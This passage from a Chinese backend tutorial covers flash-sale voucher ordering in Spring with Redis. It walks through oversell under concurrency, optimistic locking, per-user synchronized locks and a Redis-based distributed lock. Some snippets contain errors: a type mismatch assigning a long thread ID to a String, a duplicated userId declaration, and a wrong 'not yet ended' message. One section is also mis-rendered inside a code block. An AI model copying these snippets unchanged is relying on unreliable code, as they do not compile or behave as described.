流程分析</h4><p>数据库中有两张表：</p><ul><li>tb_voucher：优惠券的基本信息，优惠金额、使用规则等</li><li>tb_seckill_voucher：优惠券的库存、开始抢购时间，结束抢购时间。特价优惠券才需要填写这些信息</li></ul><p>voucher中存储了优惠券的基本信息，而seckill_voucher是特价优惠券，对优惠券添加了额外的抢购信息。</p><p>我们需要向借助于Postman向服务发起请求，添加特价优惠券。</p><p>注意当前时间必须在beginTime与endTime的时间段内，否则前端页面中不会显示出已添加的特价优惠券。</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221031122855313.png" alt="image-20221031122855313" style="zoom:33%;" /><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;shopId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;100元代金券&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;subTitle&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;周一至周五均可使用&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;全场通用\\n无需预约\\n可无限叠加\\不兑现、不找零\\n仅限堂食&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;payValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8000</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;actualValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10000</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;stock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;beginTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2022-10-30T10:09:17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;endTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2022-10-30T12:09:17&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>秒杀下单流程分析：</p><ol><li>提交优惠券ID</li><li>查询优惠券信息，判断秒杀是否开始与结束、库存是否充足</li><li>扣减库存，创建订单，返回订单ID</li></ol><h4 id="3-2-2-代码实现"><a href="#3-2-2-代码实现" class="headerlink" title="3.2.2 代码实现"></a>3.2.2 代码实现</h4><ol><li><p>修改VoucherOrderController中的seckillVoucher方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;seckill/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long voucherId)</span> &#123;<br>    <span class="hljs-keyword">return</span> voucherOrderService.seckillVoucher(voucherId);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>实现该方法</p></li><li><p>&#96;&#96;&#96;java<br>@Override<br>@Transactional<br>public Result seckillVoucher(Long voucherId) {<br>&#x2F;&#x2F; 1.查询优惠券<br>SeckillVoucher voucher &#x3D; seckillVoucherService.getById(voucherId);<br>&#x2F;&#x2F; 2.判断秒杀是否开始与结束<br>if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {<br>    return Result.fail(“秒杀尚未开始！”);<br>}<br>if (voucher.getEndTime().isBefore(LocalDateTime.now())) {<br>    return Result.fail(“秒杀尚未结束！”);<br>}<br>&#x2F;&#x2F; 3.判断库存是否充足<br>if (voucher.getStock() &lt; 1) {<br>    return Result.fail(“库存不足！”);<br>}<br>&#x2F;&#x2F; 4.扣减库存<br>boolean success &#x3D; seckillVoucherService.update()<br>    .setSql(“stock &#x3D; stock - 1”)<br>    .eq(“voucher_id”, voucherId).update();<br>if (!success) {<br>    return Result.fail(“库存不足！”);<br>}<br>&#x2F;&#x2F; 5.创建订单<br>VoucherOrder voucherOrder &#x3D; new VoucherOrder();<br>long orderId &#x3D; redisIdWorker.nextId(“order”);<br>voucherOrder.setId(orderId);<br>Long userId &#x3D; UserHolder.getUser().getId();<br>voucherOrder.setUserId(userId);<br>voucherOrder.setVoucherId(voucherId);<br>save(voucherOrder);<br>return Result.ok(orderId);<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### <span class="hljs-number">3.3</span> 超卖问题<br><br>#### <span class="hljs-number">3.2</span><span class="hljs-number">.1</span> 问题与解决方案<br><br>采用JMeter对秒杀接口进行测试，请求数为<span class="hljs-number">200</span>（此处记得在JMeter中设置请求头Token）。发现出现了超卖问题。<br><br>假设线程<span class="hljs-number">1</span>过来查询库存，判断出来库存大于<span class="hljs-number">1</span>，正准备去扣减库存，但是还没有来得及去扣减，此时线程<span class="hljs-number">2</span>过来，线程<span class="hljs-number">2</span>也去查询库存，发现这个数量一定也大于<span class="hljs-number">1</span>，那么这两个线程都会去扣减库存，最终多个线程相当于一起去扣减库存，此时就会出现库存的超卖问题。<br><br>解决方案如下：<br><br>-   悲观锁：认为线程安全问题一定会发生，因此在操作数据之前先获取锁，确保线程串行执行。例如Synchronized、Lock都属于悲观锁<br>-   乐观锁：认为线程安全问题不一定会发生，因此不加锁，只是在更新数据时去判断有没有其它线程对数据做了修改。如果没有修改则认为是安全的，自己才更新数据。如果已经被其它线程修改说明发生了安全问题，此时可以重试或异常。<br>    -   版本号法：给数据加一个version字段。每当数据修改时，version自增<span class="hljs-number">1</span>。通过version来判断数据是否被修改。<br>    -   CAS法：先比较再修改。在修改时需要判断之前查询到的值与当前的值是否相等，相等才做修改。<br>-   悲观锁 vs 乐观锁<br>    -   悲观锁实现起来较为简单，但是性能一般<br>    -   乐观锁性能好，但是存在成功率低的问题<br><br>#### <span class="hljs-number">3.2</span><span class="hljs-number">.2</span> 代码实现<br><br>乐观锁代码实现：<br><br>修改<span class="hljs-number">3.2</span>部分代码中的扣减库存内容：只需要确保当前数据库库存大于<span class="hljs-number">0</span>，即可扣减库存。<br><br>```java<br><span class="hljs-comment">// 4.扣减库存</span><br>boolean success = seckillVoucherService.update()<br>    .setSql(<span class="hljs-string">&quot;stock = stock - 1&quot;</span>)<br>    .eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="hljs-string">&quot;stock&quot;</span>, <span class="hljs-number">0</span>)<br>    .update();<br><span class="hljs-keyword">if</span> (!success) &#123;<br>    return Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="3-4-一人一单需求"><a href="#3-4-一人一单需求" class="headerlink" title="3.4 一人一单需求"></a>3.4 一人一单需求</h3><h4 id="3-4-1-流程分析"><a href="#3-4-1-流程分析" class="headerlink" title="3.4.1 流程分析"></a>3.4.1 流程分析</h4><p>同一个优惠券，一个用户只能下一单</p><p>添加该需求之后，新的流程为：</p><p>秒杀下单流程分析：</p><ol><li>提交优惠券ID</li><li>查询优惠券信息，判断秒杀是否开始与结束、库存是否充足</li><li>根据优惠券ID与用户ID查询订单。若存在，则说明该用户已下过单，返回失败。</li><li>扣减库存，创建订单，返回订单ID</li></ol><h4 id="3-4-2-代码实现"><a href="#3-4-2-代码实现" class="headerlink" title="3.4.2 代码实现"></a>3.4.2 代码实现</h4><p>第一版代码如下：</p><p>该代码存在线程并发安全问题，多个线程同时查询，同时执行扣减库存操作，同时创建订单，造成一人一单失败。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;<br>    <span class="hljs-comment">// 1.查询优惠券</span><br>    <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">voucher</span> <span class="hljs-operator">=</span> seckillVoucherService.getById(voucherId);<br>    <span class="hljs-comment">// 2.判断秒杀是否开始与结束</span><br>    <span class="hljs-keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未开始！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未结束！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 3.判断库存是否充足</span><br>    <span class="hljs-keyword">if</span> (voucher.getStock() &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 4.一人一单，查询订单</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).count();<br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;用户已经购买过一次！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 5.扣减库存</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> seckillVoucherService.update()<br>        .setSql(<span class="hljs-string">&quot;stock = stock - 1&quot;</span>)<br>        .eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="hljs-string">&quot;stock&quot;</span>, <span class="hljs-number">0</span>)<br>        .update();<br>    <span class="hljs-keyword">if</span> (!success) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 6.创建订单</span><br>    <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>();<br>    <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);<br>    voucherOrder.setId(orderId);<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    voucherOrder.setUserId(userId);<br>    voucherOrder.setVoucherId(voucherId);<br>    save(voucherOrder);<br>    <span class="hljs-keyword">return</span> Result.ok(orderId);<br>&#125;<br></code></pre></td></tr></table></figure><p>第二版代码：悲观锁</p><p>将查询订单、扣减库存、创建订单等代码进行抽取，并添加@Transactional注解，删除原本seckillVoucher方法的事务注解</p><ul><li><p>用用户的ID作为Synchronized锁。</p></li><li><p>释放锁的操作应该在提交事务之后才执行，因此需要在seckillVoucher中加Synchronized锁，包裹createVoucherOrder方法</p></li><li><p>非事务调用事务方法，会导致事务失效。因为调用者是this，是当前对象，而不是代理对象。非代理对象不具备事务功能</p><ol><li><p>添加如下依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>在启动类HmDianPingApplication中添加注解：<code>@EnableAspectJAutoProxy(exposeProxy = true)</code></p></li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;<br>    <span class="hljs-comment">// 1.查询优惠券</span><br>    <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">voucher</span> <span class="hljs-operator">=</span> seckillVoucherService.getById(voucherId);<br>    <span class="hljs-comment">// 2.判断秒杀是否开始与结束</span><br>    <span class="hljs-keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未开始！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未结束！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 3.判断库存是否充足</span><br>    <span class="hljs-keyword">if</span> (voucher.getStock() &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-comment">// 为避免每次toString得到新的字符串对象，需要采用intern方法将其添加字符串池</span><br>    <span class="hljs-keyword">synchronized</span> (userId.toString().intern()) &#123;<br>        <span class="hljs-type">IVoucherOrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IVoucherOrderService) AopContext.currentProxy();<br>        <span class="hljs-keyword">return</span> proxy.createVoucherOrder(voucherId);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">createVoucherOrder</span><span class="hljs-params">(Long voucherId)</span> &#123;<br>    <span class="hljs-comment">// 4.一人一单，查询订单</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).count();<br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;用户已经购买过一次！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 5.扣减库存</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> seckillVoucherService.update()<br>        .setSql(<span class="hljs-string">&quot;stock = stock - 1&quot;</span>)<br>        .eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="hljs-string">&quot;stock&quot;</span>, <span class="hljs-number">0</span>)<br>        .update();<br>    <span class="hljs-keyword">if</span> (!success) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 6.创建订单</span><br>    <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>();<br>    <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);<br>    voucherOrder.setId(orderId);<br>    voucherOrder.setUserId(userId);<br>    voucherOrder.setVoucherId(voucherId);<br>    save(voucherOrder);<br>    <span class="hljs-comment">// 7.返回订单ID</span><br>    <span class="hljs-keyword">return</span> Result.ok(orderId);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-5-集群下的线程安全问题"><a href="#3-5-集群下的线程安全问题" class="headerlink" title="3.5 集群下的线程安全问题"></a>3.5 集群下的线程安全问题</h3><h4 id="3-5-1-前置准备"><a href="#3-5-1-前置准备" class="headerlink" title="3.5.1 前置准备"></a>3.5.1 前置准备</h4><ol><li><p>复制一个新的启动类</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221101175643840.png" alt="image-20221101175643840" style="zoom: 50%;" /></li><li><p>修改nginx配置文件，实现反向代理和负载均衡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs conf">location /api &#123;  <br>    default_type  application/json;<br>    #internal;  <br>    keepalive_timeout   30s;  <br>    keepalive_requests  1000;  <br>    #支持keep-alive  <br>    proxy_http_version 1.1;  <br>    rewrite /api(/.*) $1 break;  <br>    proxy_pass_request_headers on;<br>    #more_clear_input_headers Accept-Encoding;  <br>    proxy_next_upstream error timeout;  <br>    #proxy_pass http://127.0.0.1:8081;<br>    proxy_pass http://backend;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>采用 <code>nginx -s reload</code> 命令重启nginx</p></li></ol><p>在单机模式下，只有一个JVM，因此采用JVM的同步锁监视器Synchronized可以解决线程安全问题</p><p>而在集群模式下，有多个JVM，因此一个JVM的悲观锁对于另外一个JVM来说是不可见的，因此无法解决线程安全问题</p><h2 id="4-分布式锁"><a href="#4-分布式锁" class="headerlink" title="4. 分布式锁"></a>4. 分布式锁</h2><h3 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h3><p>分布式锁：满足分布式系统或集群模式下多进程可见并且互斥的锁。</p><p>分布式锁的核心思想：每个服务共用同一把锁，只要大家使用的是同一把锁，那么我们就能锁住线程，不让线程进行，让程序串行执行。</p><ul><li>可见性：多个线程都能看到相同的结果<ul><li>注意：这个地方说的可见性并不是并发编程中指的内存可见性，只是说多个进程之间都能感知到变化的意思</li></ul></li><li>互斥：互斥是分布式锁的最基本的条件，使得程序串行执行</li><li>高可用：程序不易崩溃，时时刻刻都保证较高的可用性</li><li>高性能：由于加锁本身就让性能降低，所有对于分布式锁本身需要他就较高的加锁性能和释放锁性能</li><li>安全性：安全也是程序中必不可少的一环</li></ul><h3 id="4-2-实现方案"><a href="#4-2-实现方案" class="headerlink" title="4.2 实现方案"></a>4.2 实现方案</h3><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221101180507154.png" alt="image-20221101180507154"></p><h3 id="4-3-基于Redis的分布式锁"><a href="#4-3-基于Redis的分布式锁" class="headerlink" title="4.3 基于Redis的分布式锁"></a>4.3 基于Redis的分布式锁</h3><h4 id="4-3-1-实现思路"><a href="#4-3-1-实现思路" class="headerlink" title="4.3.1 实现思路"></a>4.3.1 实现思路</h4><ol><li>获取锁：<ul><li>采用 <code>setnx</code> 命令确保互斥性，采用 <code>expire</code> 命令确保超时释放，防止Redis宕机造成锁无法释放的问题。</li><li>为确保上述两操作的原子性，可以在同一个 <code>set</code> 命令中，执行上述两个操作。</li><li>非阻塞：若尝试一次成功，则返回 true；否则返回 false</li></ul></li><li>释放锁：<ul><li>手动释放，采用 <code>del</code> 删除</li><li>超时释放</li></ul></li></ol><h4 id="4-3-2-代码实现"><a href="#4-3-2-代码实现" class="headerlink" title="4.3.2 代码实现"></a>4.3.2 代码实现</h4><h5 id="第一版代码"><a href="#第一版代码" class="headerlink" title="第一版代码"></a>第一版代码</h5><ol><li><p>在utils包下添加ILock接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ILock</span> &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeoutSec)</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>实现该接口：SimpleRedisLock</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRedisLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ILock</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> StringRedisTemplate template;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lock:&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleRedisLock</span><span class="hljs-params">(String name, StringRedisTemplate template)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.template = template;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeoutSec)</span> &#123;<br>        <span class="hljs-comment">// 获取线程标识</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> Thread.currentThread().getId();<br>        <span class="hljs-comment">// 获取锁</span><br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> template.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId + <span class="hljs-string">&quot;&quot;</span>, timeoutSec, TimeUnit.SECONDS);<br>        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 释放锁</span><br>    template.delete(KEY_PREFIX + name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改VoucherOrderServiceImpl中加锁的逻辑：只对同一个用户做限制（一人一单）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建锁对象</span><br><span class="hljs-type">SimpleRedisLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRedisLock</span>(<span class="hljs-string">&quot;order:&quot;</span> + userId, template);<br><span class="hljs-comment">// 获取锁</span><br><span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock(<span class="hljs-number">1200</span>);<br><span class="hljs-keyword">if</span> (!isLock) &#123;<br>    <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;不允许重复下单&quot;</span>);<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">IVoucherOrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IVoucherOrderService) AopContext.currentProxy();<br>    <span class="hljs-keyword">return</span> proxy.createVoucherOrder(voucherId);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    lock.unlock();<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h5 id="防误删"><a href="#防误删" class="headerlink" title="防误删"></a>防误删</h5><p>释放锁时，可能出现释放其他线程锁的情况</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221101181842615.png" alt="image-20221101181842615"></p><p>改进思路：</p><ol><li><p>在获取锁时，需要设置该锁对应的值value：用UUID（当前服务对应的唯一ID） + 当前线程ID作为标识。</p><p>防止不同JVM之间造成的线程ID冲突问题</p></li><li><p>在释放锁时，需要先判断当前线程的标识是否与锁的线程标识一致</p></li></ol><p>代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 